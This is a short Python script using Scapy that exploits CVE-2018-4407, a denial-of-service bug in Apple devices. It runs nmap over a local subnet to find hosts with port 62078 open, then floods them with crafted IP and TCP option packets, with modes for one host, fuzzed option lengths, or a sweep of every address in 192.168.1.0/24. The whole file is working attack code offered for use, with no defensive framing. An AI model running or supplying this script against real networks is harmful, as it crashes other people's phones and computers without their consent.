from scapy.all import *
import sys
import os
try:
    router = sys.argv[2]
    ips_raw = os.popen("nmap "+ router +"/24 -p 62078 | grep 'scan report for' | awk '{print $5}'").readlines()
    ips_str = ''.join(str(e) for e in ips_raw)
    ips_array = ips_str.split('\n')
    ips_array.remove('')
except Exception as e:
        print ("Usage python CVE-2018-4407.py Mode Router IP")
        print ("Modes: a = Single | b = Fuzzy")

try:
    answer = sys.argv[1]
    
    if answer == "a":
        for i in ips_array:
            print ("[*] Trying CVE-2018-4407 ICMP DOS " + i)
            send(IP(dst=i,options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
    if answer == "b":
        for j in ips_array:
            for i in range(8,20):
                send(IP(dst=j,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
    if answer == "c":
            IPADDRESSES = []
            for i in range(2,254):
                IPADDRESSES.append("192.168.1." + str(i))
                send(IP(dst=IPADDRESSES,options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
    if answer == "d":
        SingleIP = sys.argv[2]
        for i in range(8,20):
            send(IP(dst=SingleIP,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
except Exception as e:
        print ("Usage python CVE-2018-4407.py Mode Router IP")
        print ("Modes: a = Single | b = Fuzzy | c = All possible IPs Currently limted to 192.168.1.1/24 | d = Specific IP")